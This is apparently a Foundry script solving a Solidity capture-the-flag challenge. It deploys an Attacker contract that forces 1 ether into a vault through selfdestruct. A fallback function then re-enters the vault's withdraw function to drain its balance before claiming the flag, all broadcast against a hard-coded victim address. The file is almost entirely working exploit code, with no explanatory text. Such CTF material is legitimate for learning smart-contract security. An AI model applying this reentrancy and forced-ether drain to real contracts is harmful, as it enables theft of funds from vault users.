// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IVault {    
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);
    function captureTheFlag(address newFlagHolder) external;
    function flagHolder() external returns (address);
}

contract SelfDestructable {
    constructor() public payable {}
    function destruct(address to) public {
        selfdestruct(payable(to));
    }
}

contract Attacker {    
    IVault vault;
    uint cnt = 0;

    constructor(address victim) public payable {
        vault = IVault(victim);
    }
    fallback() external payable {
        if (msg.value == 0) {
            cnt += 1;
        }
        if (cnt <= 1) {
            vault.withdraw(0 ether, address(this), address(this));
        }
    }

    function attack(address newFlagHolder) public {
        SelfDestructable d = new SelfDestructable{value: 1 ether}();
        d.destruct(address(vault));

        vault.withdraw(0 ether, address(this), address(this));
        require(address(vault).balance == 0, "vault balance is not zero");
        vault.captureTheFlag(newFlagHolder);
    }
}

contract CTFScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        address victim = 0x8043e6836416d13095567ac645be7C629715885c;
        address attacker_eoa = 0xF5BED21BD285CBe352737F686766cCC19BeE7acC;
        console.log("Balance before victim:", victim.balance);
        console.log("Balance before attacker EOA:", attacker_eoa.balance);
        Attacker attacker = new Attacker{value: 1 ether}(victim);
        console.log("Balance before attacker:", address(attacker).balance);
        
        attacker.attack(attacker_eoa);

        console.log("Balance after victim:", victim.balance);
        console.log("Balance after attacker EOA:", attacker_eoa.balance);
        console.log("Balance after attacker:", address(attacker).balance);
    }
}
